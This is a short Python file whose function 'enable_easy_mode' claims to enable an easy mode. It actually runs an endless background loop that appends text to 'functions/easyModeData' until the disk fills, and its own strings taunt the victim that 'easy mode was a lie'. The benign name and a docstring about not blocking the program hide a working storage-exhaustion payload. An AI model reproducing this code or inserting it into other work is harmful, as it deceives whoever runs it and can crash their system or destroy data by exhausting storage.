import os
import asyncio
import threading

async def enable_easy_mode():
    while True:
        await asyncio.to_thread(_write_to_file, "functions/easyModeData", "btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
        # unless you're reading this, then you get a cookie

def _write_to_file(filepath, content):
    with open(filepath, "a") as ef:
        ef.write(content)

def start_easy_mode_background():
    """Start easy mode in a background thread so it doesn't block the main program."""
    def run_async():
        asyncio.run(enable_easy_mode())
    
    thread = threading.Thread(target=run_async, daemon=True)
    thread.start()
    return thread